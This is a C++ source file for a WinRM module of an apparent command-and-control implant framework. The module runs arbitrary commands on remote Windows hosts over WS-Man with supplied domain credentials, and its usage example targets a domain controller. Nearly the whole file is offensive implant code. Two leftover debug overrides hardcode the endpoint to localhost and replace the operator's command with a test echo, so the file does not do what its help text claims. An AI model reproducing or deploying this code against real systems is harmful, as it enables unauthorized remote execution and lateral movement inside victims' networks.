#include "WinRM.hpp"

#include "Common.hpp"

#include <sstream>

#ifdef _WIN32
#include <windows.h>
#define WSMAN_API_VERSION_1_1 1
#include <wsman.h>
#endif

using namespace std;

constexpr std::string_view moduleNameWinRM = "winrm";
constexpr unsigned long long moduleHashWinRM = djb2(moduleNameWinRM);

#ifdef _WIN32
extern "C" __declspec(dllexport) WinRM* WinRMConstructor()
{
    return new WinRM();
}
#else
extern "C" __attribute__((visibility("default"))) WinRM* WinRMConstructor()
{
    return new WinRM();
}
#endif

WinRM::WinRM()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleNameWinRM), moduleHashWinRM)
#else
    : ModuleCmd("", moduleHashWinRM)
#endif
{
}

WinRM::~WinRM() = default;

std::string WinRM::getInfo()
{
    std::ostringstream oss;
#ifdef BUILD_TEAMSERVER
    oss << "WinRM Client API Module:\n";
    oss << "Execute commands remotely over WS-Man using the native WinRM client API." << '\n';
    oss << "Options:" << '\n';
    oss << "  -e <endpoint>        Remote host or URL (host defaults to http://<host>:5985/wsman)." << '\n';
    oss << "  -c <command>         Command to execute." << '\n';
    oss << "  -a <arguments>       Arguments passed to the command." << '\n';
    oss << "  -u <user>            DOMAIN\\user credentials." << '\n';
    oss << "  -p <password>        Password for the credential." << '\n';
    oss << "  --https              Use HTTPS (port 5986)." << '\n';
    oss << "Example:" << '\n';
    oss << "  winrm -e dc01.contoso.local -c cmd.exe -a \"/c whoami\"" << '\n';
#endif
    return oss.str();
}

std::string WinRM::packParameters(const Parameters& params) const
{
    std::string packed;
    auto append = [&packed](const std::string& value)
    {
        packed.append(value);
        packed.push_back('\0');
    };

    append(params.endpoint);
    append(params.command);
    append(params.arguments);
    append(params.username);
    append(params.password);
    append(params.useHttps ? "1" : "0");
    return packed;
}

WinRM::Parameters WinRM::unpackParameters(const std::string& data) const
{
    Parameters params;
    std::vector<std::string> parts;
    size_t start = 0;
    while (start < data.size())
    {
        size_t end = data.find('\0', start);
        if (end == std::string::npos)
        {
            break;
        }
        parts.emplace_back(data.substr(start, end - start));
        start = end + 1;
    }

    if (parts.size() < 6)
    {
        return params;
    }

    params.endpoint = parts[0];
    params.command = parts[1];
    params.arguments = parts[2];
    params.username = parts[3];
    params.password = parts[4];
    params.useHttps = parts[5] == "1";
    return params;
}

int WinRM::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    std::vector<std::string> args = regroupStrings(splitedCmd);
    Parameters params;

    if (args.size() < 2)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    for (size_t i = 1; i < args.size(); ++i)
    {
        const std::string& current = args[i];
        if (current == "-e" && i + 1 < args.size())
        {
            params.endpoint = args[++i];
        }
        else if (current == "-c" && i + 1 < args.size())
        {
            params.command = args[++i];
        }
        else if (current == "-a" && i + 1 < args.size())
        {
            params.arguments = args[++i];
        }
        else if (current == "-u" && i + 1 < args.size())
        {
            params.username = args[++i];
        }
        else if (current == "-p" && i + 1 < args.size())
        {
            params.password = args[++i];
        }
        else if (current == "--https")
        {
            params.useHttps = true;
        }
        else if (!current.empty() && current[0] != '-')
        {
            if (params.endpoint.empty())
            {
                params.endpoint = current;
            }
            else if (params.command.empty())
            {
                params.command = current;
            }
            else if (params.arguments.empty())
            {
                params.arguments = current;
            }
        }
    }

    if (params.endpoint.empty() || params.command.empty())
    {
        c2Message.set_returnvalue("Missing endpoint or command.\n" + getInfo());
        return -1;
    }

    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd(packParameters(params));
#endif
    return 0;
}

int WinRM::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    Parameters params = unpackParameters(c2Message.cmd());
    std::string result;

#ifdef _WIN32
    result = runCommand(params);
#else
    (void)params;
    result = "WinRM module is only supported on Windows.\n";
#endif

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(c2Message.cmd());
    c2RetMessage.set_returnvalue(result);
    return 0;
}

int WinRM::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
    errorMsg = c2RetMessage.returnvalue();
    return 0;
}

#ifdef _WIN32
namespace
{
    std::wstring widen(const std::string& value)
    {
        if (value.empty())
        {
            return std::wstring();
        }

        int required = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0);
        if (required <= 0)
        {
            return std::wstring();
        }

        std::wstring buffer(static_cast<size_t>(required), L'\0');
        MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), buffer.data(), required);
        return buffer;
    }

    std::string narrow(const std::wstring& value)
    {
        if (value.empty())
        {
            return std::string();
        }

        int required = WideCharToMultiByte(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0, nullptr, nullptr);
        if (required <= 0)
        {
            return std::string();
        }

        std::string buffer(static_cast<size_t>(required), '\0');
        WideCharToMultiByte(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), buffer.data(), required, nullptr, nullptr);
        return buffer;
    }

    std::string formatWin32Error(DWORD errorCode, PCWSTR detail)
    {
        std::ostringstream oss;
        oss << "WinRM API error 0x" << std::hex << std::uppercase << errorCode;
        oss << std::nouppercase << std::dec;

        if (detail != nullptr)
        {
            oss << ": " << narrow(std::wstring(detail));
        }
        else
        {
            LPWSTR messageBuffer = nullptr;
            DWORD length = FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                                          nullptr,
                                          errorCode,
                                          0,
                                          reinterpret_cast<LPWSTR>(&messageBuffer),
                                          0,
                                          nullptr);
            if (length != 0 && messageBuffer != nullptr)
            {
                oss << ": " << narrow(std::wstring(messageBuffer, messageBuffer + length));
                LocalFree(messageBuffer);
            }
        }

        oss << '\n';
        return oss.str();
    }

    std::string buildEndpoint(const WinRM::Parameters& params)
    {
        if (params.endpoint.rfind("http://", 0) == 0 || params.endpoint.rfind("https://", 0) == 0)
        {
            return params.endpoint;
        }

        std::ostringstream oss;
        oss << (params.useHttps ? "https://" : "http://");
        oss << params.endpoint;
        oss << (params.useHttps ? ":5986/wsman" : ":5985/wsman");
        return oss.str();
    }

    struct ShellContext
    {
        HANDLE eventHandle = nullptr;
        DWORD errorCode = ERROR_SUCCESS;
        std::string message;
    };

    struct CommandContext
    {
        HANDLE eventHandle = nullptr;
        DWORD errorCode = ERROR_SUCCESS;
        std::string message;
        WSMAN_COMMAND_HANDLE commandHandle = nullptr;
    };

    struct ReceiveContext
    {
        HANDLE eventHandle = nullptr;
        DWORD errorCode = ERROR_SUCCESS;
        std::string message;
        std::string output;
        DWORD exitCode = 0;
        bool completed = false;
    };

    void CALLBACK ShellCallback(PVOID context,
                                 DWORD flags,
                                 WSMAN_ERROR* error,
                                 WSMAN_SHELL_HANDLE shell,
                                 WSMAN_COMMAND_HANDLE /*command*/,
                                 WSMAN_OPERATION_HANDLE operationHandle,
                                 WSMAN_RESPONSE_DATA* /*data*/)
    {
        (void)flags;
        (void)shell;

        auto* shellContext = static_cast<ShellContext*>(context);
        if (error != nullptr && error->code != ERROR_SUCCESS)
        {
            shellContext->errorCode = error->code;
            if (error->errorDetail != nullptr)
            {
                shellContext->message = narrow(std::wstring(error->errorDetail));
            }
        }

        if (operationHandle != nullptr)
        {
            WSManCloseOperation(operationHandle, 0);
        }

        if (shellContext->eventHandle != nullptr)
        {
            SetEvent(shellContext->eventHandle);
        }
    }

    void CALLBACK CommandCallback(PVOID context,
                                   DWORD flags,
                                   WSMAN_ERROR* error,
                                   WSMAN_SHELL_HANDLE /*shell*/,
                                   WSMAN_COMMAND_HANDLE command,
                                   WSMAN_OPERATION_HANDLE operationHandle,
                                   WSMAN_RESPONSE_DATA* /*data*/)
    {
        (void)flags;

        auto* commandContext = static_cast<CommandContext*>(context);
        if (error != nullptr && error->code != ERROR_SUCCESS)
        {
            commandContext->errorCode = error->code;
            if (error->errorDetail != nullptr)
            {
                commandContext->message = narrow(std::wstring(error->errorDetail));
            }
        }
        else
        {
            commandContext->commandHandle = command;
        }

        if (operationHandle != nullptr)
        {
            WSManCloseOperation(operationHandle, 0);
        }

        if (commandContext->eventHandle != nullptr)
        {
            SetEvent(commandContext->eventHandle);
        }
    }

    void CALLBACK ReceiveCallback(PVOID context,
                                   DWORD flags,
                                   WSMAN_ERROR* error,
                                   WSMAN_SHELL_HANDLE /*shell*/,
                                   WSMAN_COMMAND_HANDLE /*command*/,
                                   WSMAN_OPERATION_HANDLE operationHandle,
                                   WSMAN_RESPONSE_DATA* data)
    {
        auto* receiveContext = static_cast<ReceiveContext*>(context);

        if (error != nullptr && error->code != ERROR_SUCCESS)
        {
            receiveContext->errorCode = error->code;
            if (error->errorDetail != nullptr)
            {
                receiveContext->message = narrow(std::wstring(error->errorDetail));
            }
            receiveContext->completed = true;
        }

        if (data != nullptr)
        {
            const WSMAN_RECEIVE_DATA_RESULT& receiveData = data->receiveData;
            if (receiveData.streamData.type == WSMAN_DATA_TYPE_TEXT &&
                receiveData.streamData.text.buffer != nullptr &&
                receiveData.streamData.text.bufferLength > 0)
            {
                std::wstring segment(receiveData.streamData.text.buffer,
                                     receiveData.streamData.text.buffer + receiveData.streamData.text.bufferLength);
                receiveContext->output.append(narrow(segment));
            }

            if (receiveData.commandState != nullptr &&
                _wcsicmp(receiveData.commandState, WSMAN_COMMAND_STATE_DONE) == 0)
            {
                receiveContext->completed = true;
                receiveContext->exitCode = receiveData.exitCode;
            }
        }

        if ((flags & WSMAN_FLAG_CALLBACK_END_OF_OPERATION) != 0)
        {
            receiveContext->completed = true;
        }

        if (operationHandle != nullptr)
        {
            WSManCloseOperation(operationHandle, 0);
        }

        if (receiveContext->eventHandle != nullptr)
        {
            SetEvent(receiveContext->eventHandle);
        }
    }
}

std::string WinRM::runCommand(const Parameters& params) const
{
    std::string endpoint = buildEndpoint(params);
    // TODO fix
    endpoint="http://localhost:5985/wsman";
    std::wstring endpointWide = widen(endpoint);

    std::wstring commandLineWide = widen(params.command);
    if (!params.arguments.empty())
    {
        commandLineWide += L" ";
        commandLineWide += widen(params.arguments);
    }

    WSMAN_API_HANDLE apiHandle = nullptr;
    DWORD status = WSManInitialize(0, &apiHandle);

    if (status != ERROR_SUCCESS)
    {
        return formatWin32Error(status, nullptr);
    }

    WSMAN_AUTHENTICATION_CREDENTIALS credentials{};
    WSMAN_AUTHENTICATION_CREDENTIALS* credentialsPtr = nullptr;
    std::wstring usernameWide;
    std::wstring passwordWide;
    if (!params.username.empty())
    {
        usernameWide = widen(params.username);
        passwordWide = widen(params.password);
        credentials.authenticationMechanism = WSMAN_FLAG_AUTH_NEGOTIATE;
        credentials.userAccount.username = usernameWide.c_str();
        credentials.userAccount.password = passwordWide.c_str();
        credentialsPtr = &credentials;
    }

    WSMAN_SESSION_HANDLE session = nullptr;
    status = WSManCreateSession(apiHandle,
                                endpointWide.empty() ? nullptr : endpointWide.c_str(),
                                0,
                                credentialsPtr,
                                nullptr,
                                &session);
    if (status != ERROR_SUCCESS)
    {
        WSManDeinitialize(apiHandle, 0);
        return formatWin32Error(status, nullptr);
    }

    ShellContext shellContext;
    shellContext.eventHandle = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (shellContext.eventHandle == nullptr)
    {
        WSManCloseSession(session, 0);
        WSManDeinitialize(apiHandle, 0);
        return "Failed to create synchronization event for WinRM shell.\n";
    }

    WSMAN_SHELL_ASYNC shellAsync{};
    shellAsync.operationContext = &shellContext;
    shellAsync.completionFunction = ShellCallback;

    WSMAN_SHELL_HANDLE shellHandle = nullptr;
    WSManCreateShell(session,
                     0,
                     WSMAN_CMDSHELL_URI,
                     nullptr,
                     nullptr,
                     nullptr,
                     &shellAsync,
                     &shellHandle);

    WaitForSingleObject(shellContext.eventHandle, INFINITE);

    if (shellContext.errorCode != ERROR_SUCCESS)
    {
        std::string message = shellContext.message.empty() ? formatWin32Error(shellContext.errorCode, nullptr)
                                                            : shellContext.message + "\n";
        CloseHandle(shellContext.eventHandle);
        WSManCloseSession(session, 0);
        WSManDeinitialize(apiHandle, 0);
        return message;
    }

    CommandContext commandContext;
    commandContext.eventHandle = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (commandContext.eventHandle == nullptr)
    {
        WSManCloseShell(shellHandle, 0, NULL);
        CloseHandle(shellContext.eventHandle);
        WSManCloseSession(session, 0);
        WSManDeinitialize(apiHandle, 0);
        return "Failed to create synchronization event for WinRM command.\n";
    }

    WSMAN_SHELL_ASYNC commandAsync{};
    commandAsync.operationContext = &commandContext;
    commandAsync.completionFunction = CommandCallback;

    // TODO FIx
    commandLineWide = L"cmd /c echo ran > C:\\Users\\max\\Desktop\\winrm_test.txt";

    WSManRunShellCommand(shellHandle,
                         0,
                         commandLineWide.c_str(),
                         nullptr,
                         nullptr,
                         &commandAsync,
                         &commandContext.commandHandle);

    WaitForSingleObject(commandContext.eventHandle, INFINITE);

    if (commandContext.errorCode != ERROR_SUCCESS)
    {
        std::string message = commandContext.message.empty() ? formatWin32Error(commandContext.errorCode, nullptr)
                                                             : commandContext.message + "\n";
        if (commandContext.commandHandle != nullptr)
        {
            WSManCloseCommand(commandContext.commandHandle, 0, NULL);
        }
        CloseHandle(commandContext.eventHandle);
        WSManCloseShell(shellHandle, 0, NULL);
        CloseHandle(shellContext.eventHandle);
        WSManCloseSession(session, 0);
        WSManDeinitialize(apiHandle, 0);
        return message;
    }

    ReceiveContext receiveContext;
    receiveContext.eventHandle = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (receiveContext.eventHandle == nullptr)
    {
        WSManCloseCommand(commandContext.commandHandle, 0, NULL);
        CloseHandle(commandContext.eventHandle);
        WSManCloseShell(shellHandle, 0, NULL);
        CloseHandle(shellContext.eventHandle);
        WSManCloseSession(session, 0);
        WSManDeinitialize(apiHandle, 0);
        return "Failed to create synchronization event for WinRM output.\n";
    }

    WSMAN_SHELL_ASYNC receiveAsync{};
    receiveAsync.operationContext = &receiveContext;
    receiveAsync.completionFunction = ReceiveCallback;

    WSMAN_STREAM_ID_SET streamSet{};
    PCWSTR streams[2] = { WSMAN_STREAM_ID_STDOUT, WSMAN_STREAM_ID_STDERR };
    streamSet.streamIDs = const_cast<PCWSTR*>(streams);
    streamSet.streamIDsCount = 2;

    while (!receiveContext.completed)
    {
        ResetEvent(receiveContext.eventHandle);
        WSMAN_OPERATION_HANDLE receiveOp = nullptr;
        WSManReceiveShellOutput(shellHandle,
                                commandContext.commandHandle,
                                0,
                                &streamSet,
                                &receiveAsync,
                                &receiveOp);


        WaitForSingleObject(receiveContext.eventHandle, INFINITE);

        if (receiveContext.errorCode != ERROR_SUCCESS)
        {
            break;
        }
    }

    std::string response;
    if (receiveContext.errorCode != ERROR_SUCCESS)
    {
        response = receiveContext.message.empty() ? formatWin32Error(receiveContext.errorCode, nullptr)
                                                  : receiveContext.message + "\n";
    }
    else
    {
        response = receiveContext.output;
        if (response.empty())
        {
            response = "Command executed with no output.\n";
        }

        std::ostringstream trailer;
        trailer << "\n[ExitCode] " << receiveContext.exitCode << "\n";
        response.append(trailer.str());
    }


    if (receiveContext.eventHandle != nullptr)
        CloseHandle(receiveContext.eventHandle);

    if (commandContext.commandHandle != nullptr)
        WSManCloseCommand(commandContext.commandHandle, 0, NULL);
    
    CloseHandle(commandContext.eventHandle);
    WSManCloseShell(shellHandle, 0, NULL);
    CloseHandle(shellContext.eventHandle);
    WSManCloseSession(session, 0);
    WSManDeinitialize(apiHandle, 0);

    return response;
}
#endif
